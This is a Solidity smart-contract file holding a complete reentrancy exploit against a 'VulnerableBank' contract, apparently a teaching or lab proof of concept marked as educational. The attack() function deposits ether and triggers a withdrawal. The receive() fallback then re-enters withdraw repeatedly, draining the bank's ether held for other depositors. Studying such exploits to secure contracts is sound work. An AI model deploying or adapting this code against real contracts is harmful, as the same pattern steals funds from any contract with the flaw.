// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balances(address) external view returns (uint256);
}

/**
 * @title ReentrancyAttack
 * @notice Exploits the reentrancy vulnerability in VulnerableBank
 * For educational purposes only!
 */
contract ReentrancyAttack {
    IVulnerableBank public vulnerableBank;
    uint256 public attackAmount;

    constructor(address _vulnerableBank) {
        vulnerableBank = IVulnerableBank(_vulnerableBank);
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether");
        attackAmount = msg.value;

        // Deposit into vulnerable bank
        vulnerableBank.deposit{value: msg.value}();

        // Start the reentrancy attack
        vulnerableBank.withdraw(msg.value);
    }

    // This will be called when VulnerableBank sends ether
    receive() external payable {
        // Reenter if there's still balance
        if (address(vulnerableBank).balance >= attackAmount) {
            vulnerableBank.withdraw(attackAmount);
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
